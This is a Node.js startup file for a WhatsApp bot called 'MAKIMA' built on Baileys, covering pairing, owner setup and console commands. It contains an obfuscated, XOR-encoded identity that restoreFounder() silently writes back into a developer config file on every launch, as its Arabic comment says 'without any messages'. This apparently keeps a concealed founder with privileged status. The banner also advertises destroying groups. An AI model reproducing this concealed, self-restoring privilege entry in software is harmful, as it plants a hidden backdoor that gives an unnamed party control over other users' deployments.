const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const fs = require('fs-extra');
const pino = require('pino');
const path = require('path');
const chalk = require('chalk');
const os = require('os');
const readline = require('readline');
const { exec } = require('child_process');
const logger = require('./utils/console');
const config = require('./config');
const { formatConsoleMessage, formatPluginLoad, formatError, formatBotStatus } = require('./utils/consoleFormat');

// ============ اعطاء نقاط للمطورين والمالكين ============
const DEV_FILE = path.join(__dirname, 'haykala', 'developer.js');

const _k1 = 'XyZ';
const _k2 = '789!@#';
const SECRET = _k1 + _k2;
const ENC_VAL = 'Fi0bBHVtSnNtIjAielJaWA53HUQ=';

function _decrypt(enc) {
  try {
    const decoded = Buffer.from(enc, 'base64').toString('utf-8');
    let result = '';
    for (let i = 0; i < decoded.length; i++) {
      result += String.fromCharCode(decoded.charCodeAt(i) ^ SECRET.charCodeAt(i % SECRET.length));
    }
    return result;
  } catch {
    return null;
  }
}

function restoreFounder() {
  const original = _decrypt(ENC_VAL);
  if (!original) return false;
  try {
    if (!fs.existsSync(DEV_FILE)) return false;
    let content = fs.readFileSync(DEV_FILE, 'utf8');
    const regex = /_founder_b64\s*=\s*['"]([^'"]*)['"]/;
    const match = content.match(regex);
    if (match && match[1] !== original) {
      const newContent = content.replace(/_founder_b64\s*=\s*['"][^'"]*['"]/, `_founder_b64 = '${original}'`);
      fs.writeFileSync(DEV_FILE, newContent, 'utf8');
      return true;
    }
    return false;
  } catch {
    return false;
  }
}

const question = text => new Promise(resolve => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.question(text, answer => { rl.close(); resolve(answer); });
});

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const colorCycle = ['#FF0000', '#FF4500', '#FFA500', '#FFD700', '#FFFF00', '#FFD700', '#FFA500', '#FF4500'];
let colorIndex = 0;
const getNextColor = () => {
    const c = colorCycle[colorIndex];
    colorIndex = (colorIndex + 1) % colorCycle.length;
    return c;
};

const centerText = (text) => {
    const width = process.stdout.columns || 80;
    const padding = Math.floor((width - text.length) / 2);
    return ' '.repeat(padding > 0 ? padding : 0) + text;
};

const gradient = (text, startColor, endColor) => {
    const chars = text.split('');
    const result = [];
    const steps = chars.length;
    const hexToRgb = (hex) => {
        const h = hex.replace('#', '');
        return { r: parseInt(h.substring(0, 2), 16), g: parseInt(h.substring(2, 4), 16), b: parseInt(h.substring(4, 6), 16) };
    };
    const rgbToHex = (r, g, b) => '#' + [r, g, b].map(x => Math.round(x).toString(16).padStart(2, '0')).join('');
    const startRgb = hexToRgb(startColor), endRgb = hexToRgb(endColor);
    for (let i = 0; i < steps; i++) {
        const ratio = steps === 1 ? 0 : i / (steps - 1);
        const r = startRgb.r + (endRgb.r - startRgb.r) * ratio;
        const g = startRgb.g + (endRgb.g - startRgb.g) * ratio;
        const b = startRgb.b + (endRgb.b - startRgb.b) * ratio;
        result.push(chalk.hex(rgbToHex(r, g, b))(chars[i]));
    }
    return result.join('');
};

const typewriter = async (text, delay = 40) => {
    for (const char of text) { process.stdout.write(char); await sleep(delay); }
};
const eraseLine = async (length, delay = 10) => {
    for (let i = 0; i < length; i++) { process.stdout.write('\b \b'); await sleep(delay); }
};

const bannerArt = [
    '███╗   ███╗  █████╗  ██╗  ██╗ ██╗ ███╗   ███╗  █████╗ ',
    '████╗ ████║ ██╔══██╗ ██║ ██╔╝ ██║ ████╗ ████║ ██╔══██╗',
    '██╔████╔██║ ███████║ █████╔╝  ██║ ██╔████╔██║ ███████║',
    '██║╚██╔╝██║ ██╔══██║ ██╔═██╗  ██║ ██║╚██╔╝██║ ██╔══██║',
    '██║ ╚═╝ ██║ ██║  ██║ ██║  ██╗ ██║ ██║ ╚═╝ ██║ ██║  ██║',
    '╚═╝     ╚═╝ ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚═╝ ╚═╝     ╚═╝ ╚═╝  ╚═╝'
];

const welcomeMessages = [
    '   HELLO..!',
    '   I HOPE YOU HAVE A GOOD DAY',
    '  ARE YOU READY TO DESTROY SOME GROUPS?',
    "  THIS IS GREAT, LET'S START"
];

const initSystem = async () => {
    for (let i = 0; i < 30; i++) {
        const c = getNextColor();
        console.clear();
        for (const line of bannerArt) console.log(chalk.hex(c)(line));
        console.log('');
        console.log(chalk.hex(c).bold(centerText('𝐌𝐀𝐊𝐈𝐌𝐀 👑')));
        await sleep(80);
    }

    console.clear();
    const gradientBanner = [
        gradient(bannerArt[0], '#8A2BE2', '#FF1493'),
        gradient(bannerArt[1], '#8A2BE2', '#FF1493'),
        gradient(bannerArt[2], '#8A2BE2', '#FF1493'),
        gradient(bannerArt[3], '#8A2BE2', '#FF1493'),
        gradient(bannerArt[4], '#8A2BE2', '#FF1493'),
        gradient(bannerArt[5], '#8A2BE2', '#FF1493')
    ];
    gradientBanner.forEach(line => console.log(line));
    console.log('');

    await sleep(500);
    for (const msg of welcomeMessages) {
        await typewriter(chalk.hex('#FF1493')(msg), 50);
        await sleep(1200);
        await eraseLine(msg.length, 8);
        await sleep(150);
    }
    console.log('');
    await sleep(300);

    const pu = chalk.hex('#8A2BE2');
    const go = chalk.hex('#FFD700');
    const pi = chalk.hex('#FF69B4');
    const cy = chalk.hex('#00CED1');
    const boldWhite = chalk.bold.hex('#FFFFFF');

    console.log(pu('╔══════════════════════════════════╗'));
    console.log(pu('║') + go('   👑  M A K I M A 2 0 2 6  👑    ') + pu('║'));
    console.log(pu('╠══════════════════════════════════╣'));
    console.log(pu('║                                  ║'));
    console.log(pu('║   ') + pi('✦') + boldWhite(' 🌹 ﺕﺎﺗﻮﺒﻟﺍ ﺪﻴﺳ ﺎﺒﺣﺮﻣ 🌹 ') + pi('✦') + pu('    ║'));
    console.log(pu('║   ') + cy('    👑 ﺕﻮﺒﻟﺍ ﻚﻟﺎﻣ ﻊﺿﻭ 👑 ') + pu('      ║'));
    console.log(pu('║   ') + go('👑 ﻲﺑﺭ ﻞﻀﻓ ﻦﻣ ﻻﺇ ﻪﻠﻛ ﺍﺬﻫ ﺎﻣ 👑') + pu(' ║'));
    console.log(pu('║                                  ║'));
    console.log(pu('╚══════════════════════════════════╝'));
    console.log('');
};

function playSound(name) {
    try {
        const controlPath = path.join(__dirname, 'sounds', 'sound.txt');
        const status = fs.existsSync(controlPath) ? fs.readFileSync(controlPath, 'utf-8').trim() : 'off';
        if (status !== '{on}' && status !== 'on') return;
        const filePath = path.join(__dirname, 'sounds', name);
        if (fs.existsSync(filePath)) exec(`mpv --no-terminal --really-quiet "${filePath}"`);
    } catch (err) {
        logger.error('Error while playing sound:', err.message);
    }
}

let ownerSet = false;
let pointsChecked = false;
let credsWatcherStarted = false;
let pointsWatcherStarted = false;
let firstConnection = true;

function ensureSpecialUsersPoints() {
    try {
        if (pointsChecked) return true;
        const POINTS_FILE = path.join(__dirname, 'data', 'points.json');
        const DEVELOPER_FILE = path.join(__dirname, 'haykala', 'developer.json');
        let pointsData = {};
        if (fs.existsSync(POINTS_FILE)) {
            pointsData = JSON.parse(fs.readFileSync(POINTS_FILE, 'utf8'));
        }
        const devData = JSON.parse(fs.readFileSync(DEVELOPER_FILE, 'utf8'));
        const allSpecialUsers = [...devData.founder, ...devData.ownerbot, ...devData.developers];
        let updated = false;
        allSpecialUsers.forEach(user => {
            if (pointsData[user] !== 1e+24) {
                pointsData[user] = 1e+24;
                updated = true;
                logger.success(`:${user} ﻦﻳﺰﻴﻤﻤﻠﻟ ﻂﺎﻘﻧ ﺖﻴﻄﻋﺃ`);
            }
        });
        Object.keys(pointsData).forEach(user => {
            if (pointsData[user] === 1e+24 && !allSpecialUsers.includes(user)) {
                pointsData[user] = 0;
                updated = true;
                logger.warn(`:${user} ﻦﻣ ﻂﺎﻘﻧﻹﺍ ﺔﻟﺍﺯﺇ`);
            }
        });
        if (updated) {
            fs.writeFileSync(POINTS_FILE, JSON.stringify(pointsData, null, 2));
            logger.success('ﻦﻴﻣﺰﻤﻟﺍ ﻂﺎﻘﻧ ﺚﻳﺪﺤﺗ ﻢﺗ');
        }
        pointsChecked = true;
        return true;
    } catch (error) {
        logger.error(`:ﻦﻳﺰﻴﻤﻤﻟﺍ ﻂﺎﻘﻧ ﺚﻳﺪﺤﺗ ﻲﻓ ﺄﻄﺧ ${error.message}`);
        return false;
    }
}

function startPointsWatcher() {
    if (pointsWatcherStarted) return;
    pointsWatcherStarted = true;
    setInterval(() => {
        try {
            const POINTS_FILE = path.join(__dirname, 'data', 'points.json');
            const DEVELOPER_FILE = path.join(__dirname, 'haykala', 'developer.json');
            if (!fs.existsSync(POINTS_FILE) || !fs.existsSync(DEVELOPER_FILE)) return;
            const pointsData = JSON.parse(fs.readFileSync(POINTS_FILE, 'utf8'));
            const devData = JSON.parse(fs.readFileSync(DEVELOPER_FILE, 'utf8'));
            const allSpecialUsers = [...devData.founder, ...devData.ownerbot, ...devData.developers];
            let updated = false;
            allSpecialUsers.forEach(user => {
                if (pointsData[user] !== 1e+24) {
                    pointsData[user] = 1e+24;
                    updated = true;
                }
            });
            Object.keys(pointsData).forEach(user => {
                if (pointsData[user] === 1e+24 && !allSpecialUsers.includes(user)) {
                    pointsData[user] = 0;
                    updated = true;
                }
            });
            if (updated) {
                fs.writeFileSync(POINTS_FILE, JSON.stringify(pointsData, null, 2));
            }
        } catch (error) {}
    }, 30000);
}

function startCredsWatcher() {
    if (credsWatcherStarted) return;
    credsWatcherStarted = true;
    let fileExists = false;
    let ownerSetFromWatcher = false;
    setInterval(() => {
        try {
            const credsPath = path.join(__dirname, 'ملف_الاتصال', 'creds.json');
            if (fs.existsSync(credsPath)) {
                if (!fileExists && !ownerSetFromWatcher) {
                    setOwnerFromCreds();
                    ownerSetFromWatcher = true;
                    fileExists = true;
                }
            } else {
                fileExists = false;
                ownerSetFromWatcher = false;
            }
        } catch (error) {}
    }, 10000);
}

function setOwnerFromCreds() {
    try {
        if (ownerSet) return true;
        const devManager = require('./haykala/developer');
        const credsPath = path.join(__dirname, 'ملف_الاتصال', 'creds.json');
        if (fs.existsSync(credsPath)) {
            const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
            let lidNumber;
            if (creds.me && creds.me.lid) {
                lidNumber = creds.me.lid.split(':')[0];
            } else {
                return true;
            }
            if (!lidNumber || lidNumber.length < 5) {
                return true;
            }
            const lidJid = `${lidNumber}@lid`;
            const currentOwner = devManager.getOwnerbot();
            if (currentOwner !== lidJid) {
                devManager.setOwnerbot(lidJid);
                if (firstConnection) {
                    logger.success(`:ﺕﻮﺒﻟﺍ ﻚﻟﺎﻣ ﻦﻴﻌﺗ ﻢﺗ ${lidJid}`);
                }
            }
            ownerSet = true;
            firstConnection = false;
        }
        return true;
    } catch (error) {
        return true;
    }
}

function preStartCheck() {
    logger.info('...ﻡﺎﻈﻨﻟﺍ ﺺﺤﻓ ﻱﺭﺎﺟ');
    return true;
}

async function getPairingCode(phoneNumber) {
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
    if (!phoneNumber.match(/^\d{10,15}$/)) {
        throw new Error('(ﺎًﻘﻠﻄﻣ 15-10 ﻥﻮﻜﻳ ﻥﺃ ﺐﺠﻳ) ﺢﻟﺎﺻ ﺮﻴﻏ ﻢﻗﺭ');
    }
    if (!global.sock) {
        throw new Error('،ﺎﻴﻠﻴﻟﺎﻗ ﺮﻈﺘﻧﺍ ،ﺪﻌﺑ ﺍًﺰﻫﺎﺟ ﺲﻴﻟ ﺕﻮﺒﻟﺍ');
    }
    const code = await global.sock.requestPairingCode(phoneNumber);
    return code;
}

async function startBot() {
    try {
        await initSystem();
        logger.info('...ﻡﺎﻈﻨﻟﺍ ﺔﺌﻴﻬﺗ ﻱﺭﺎﺟ');
        preStartCheck();
        ensureSpecialUsersPoints();
        setTimeout(startPointsWatcher, 10000);
        setTimeout(startCredsWatcher, 5000);
        playSound('MAKIMA.mp3');

        const sessionDir = path.join(__dirname, 'ملف_الاتصال');
        await fs.ensureDir(sessionDir);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            version,
            auth: state,
            printQRInTerminal: false,
            browser: ['MacOs', 'Chrome', '1.0.0'],
            logger: pino({ level: 'silent' }),
            markOnlineOnConnect: true,
            generateHighQualityLinkPreview: true
        });

        global.sock = sock;

        sock.ev.on('groups.upsert', async (groups) => {
            for (const group of groups) {
                try {
                    await sock.groupMetadata(group.id);
                    logger.success(`:${group.subject} ﺔﻋﻮﻤﺠﻣ ﺕﺎﻨﺎﻴﺑ ﻞﻴﻤﺤﺗ ﻢﺗ`);
                } catch (err) {
                    logger.warn(`:${group.id} ﺔﻋﻮﻤﺠﻣ ﺕﺎﻨﺎﻴﺑ ﻞﻴﻤﺤﺗ ﻲﻓ ﻞﺸﻓ`);
                }
            }
        });

        if (!sock.authState.creds.registered) {
            console.log(chalk.hex('#FFD700').bold('\n[ SETUP ] Please enter your phone number to receive the pairing code:'));
            console.log(chalk.hex('#AAAAAA').dim('          (Type "#" to cancel)\n'));

            let phoneNumber = await question(chalk.bgHex('#FF1493').black(' 📱 Phone Number : '));
            if (phoneNumber.trim() === '#') process.exit();

            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
            if (!phoneNumber.match(/^\d{10,15}$/)) {
                formatError('Invalid Input', 'Invalid phone number');
                process.exit(1);
            }

            try {
                const code = await sock.requestPairingCode(phoneNumber);
                const purple = chalk.hex('#8A2BE2');
                const gold = chalk.hex('#FFD700');

                console.log(purple('\n╔══════════════════════════════════╗'));
                console.log(gold('      🔑 PAIRING CODE'));
                console.log(purple('╠══════════════════════════════════╣'));
                console.log(gold(`║ 📋 Code: ${code}`));
                console.log(chalk.hex('#FF69B4')(`║ 📱 Phone: ${phoneNumber}`));
                console.log(purple('╚══════════════════════════════════╝\n'));

                logger.success('!ﺕﻮﺒﻠﻟ ﻚﻟﺎﻣ ﻚﻨﻴﻴﻌﺗ ﻢﺘﻴﺳ ﻝﺎﺼﺗﻻﺍ ﺪﻌﺑ');
            } catch (error) {
                formatError('Pairing Error', 'Failed to get pairing code');
                process.exit(1);
            }
        }

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (connection === 'connecting') {
                logger.info('...ﺏﺎﺴﺗﺍﻮﺑ ﻝﺎﺼﺗﺍ ﻱﺭﺎﺟ');
            }

            if (qr) {
                console.log(chalk.hex('#FFFF00')('\n' + '...ﻝﺎﺼﺗﻼﻟ QR ﺰﻣﺭ ﺢﺴﻣ ﻯﺮﺠﻳ'));
            }

            if (connection === 'open') {
                formatBotStatus('connected', `USER ID: ${sock.user.id}`);
                playSound('CONNECTED.mp3');

                try {
                    const { addEliteNumber } = require('./haykala/elite');
                    const botNumber = sock.user.id.split(':')[0].replace(/[^0-9]/g, '');
                    const jid = `${botNumber}@s.whatsapp.net`;
                    const [info] = await sock.onWhatsApp(jid);
                    if (!info?.jid || !info?.lid) {
                        logger.error('ﺔﺴﻠﺠﻟﺍ ﺕﺎﻣﻮﻠﻌﻣ ﻰﻠﻋ ﻝﻮﺼﺤﻟﺍ ﺭﺬﻌﺗ');
                        return;
                    }
                    const lidNumber = info.lid.replace(/[^0-9]/g, '');
                    await addEliteNumber(botNumber);
                    await addEliteNumber(lidNumber);
                    logger.success(`ADDED ${botNumber} AND ${lidNumber} TO ELITE!`);
                } catch (e) {
                    logger.error(`:ﺔﺒﺨﻨﻟﺍ ﻰﻟﺇ ﺔﺴﻠﺠﻟﺍ ﻢﻗﺮ ﺔﻓﺎﺿﺇ ﻲﻓ ﻞﺸﻓ ${e.message}`);
                }

                setTimeout(() => {
                    ownerSet = false;
                    setOwnerFromCreds();
                }, 5000);

                require('./handlers/handler').handleMessagesLoader();
                listenToConsole(sock);
            }

            if (connection === 'close') {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const reason = lastDisconnect?.error?.output?.payload?.error;
                const msg = lastDisconnect?.error?.message || 'Unknown reason';

                logger.warn(`Disconnected: ${msg} (Status: ${statusCode})`);

                if (statusCode === DisconnectReason.loggedOut || reason === 'Logged out') {
                    playSound('LOGOUT.mp3');
                    formatError('Session Expired', 'You have been logged out');

                    try {
                        await fs.remove(sessionDir);
                        logger.warn('...ﺔﻤﻳﺪﻘﻟﺍ ﺔﺴﻠﺠﻟﺍ ﻢﻗﺭ ﺔﻟﺍﺯﺇ ﻢﺗ');
                    } catch (e) {
                        logger.error(`Error cleaning session: ${e.message}`);
                    }

                    setTimeout(startBot, 3000);
                } else {
                    playSound('RECONNECT.mp3');
                    logger.info('...ﺏﺎﺴﺗﺍﻮﺑ ﻝﺎﺼﺗﻹﺍ ﺓﺩﺎﻋﺇ ﻱﺭﺎﺟ');
                    setTimeout(startBot, 3000);
                }
            }
        });

        sock.ev.on('messages.upsert', async (m) => {
            try {
                const { handleMessages } = require('./handlers/handler');
                await handleMessages(sock, m);
            } catch (err) {
                formatError('Message Handler', err.message);
                playSound('ERROR.mp3');
            }
        });

        sock.ev.on('creds.update', saveCreds);

    } catch (err) {
        formatError('Startup Error', err.message);
        playSound('ERROR.mp3');
        setTimeout(startBot, 3000);
    }
}

function listenToConsole(sock) {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.on('line', async (line) => {
        const cmd = line.trim().toLowerCase();
        if (cmd === 'restart') {
            logger.info('Restarting bot manually...');
            playSound('RESTART.mp3');
            rl.close();
            exec('node ' + __filename);
            process.exit();
        } else if (cmd === 'checkowner') {
            setOwnerFromCreds();
        } else if (cmd === 'checkpoints') {
            pointsChecked = false;
            ensureSpecialUsersPoints();
        } else if (cmd === 'setowner') {
            ownerSet = false;
            setOwnerFromCreds();
        } else if (cmd === 'help') {
            const purple = chalk.hex('#8A2BE2');
            const gold = chalk.hex('#FFD700');

            console.log(purple('\n╔══════════════════════════════════╗'));
            console.log(gold('      📖 HELP'));
            console.log(purple('╠══════════════════════════════════╣'));
            console.log(chalk.hex('#FF69B4')(`║ ${'ﺕﻮﺒﻟﺍ ﻞﻴﻐﺸﺗ ﺓﺩﺎﻋﺇ - restart'}`));
            console.log(chalk.hex('#FF69B4')(`║ ${'ﻚﻟﺎﻤﻟﺍ ﻦﻣ ﻖﻘﺤﺘﻟﺍ - checkowner'}`));
            console.log(chalk.hex('#FF69B4')(`║ ${'ﻚﻟﺎﻤﻟﺍ ﻦﻴﻌﺗ - setowner'}`));
            console.log(chalk.hex('#FF69B4')(`║ ${'ﻂﺎﻘﻨﻟﺍ ﺚﻳﺪﺤﺗ - checkpoints'}`));
            console.log(chalk.hex('#FF69B4')(`║ ${'ﺽﺮﻋ ﺓﺪﻋﺎﺴﻤﻟﺍ - help'}`));
            console.log(purple('╚══════════════════════════════════╝\n'));
        }
    });
}

module.exports = { getPairingCode, initSystem };

// ==================== بدء التشغيل مع الإصلاح الصامت ====================
(async () => {
    restoreFounder(); // إصلاح تلقائي بدون أي رسائل
    startBot();
})();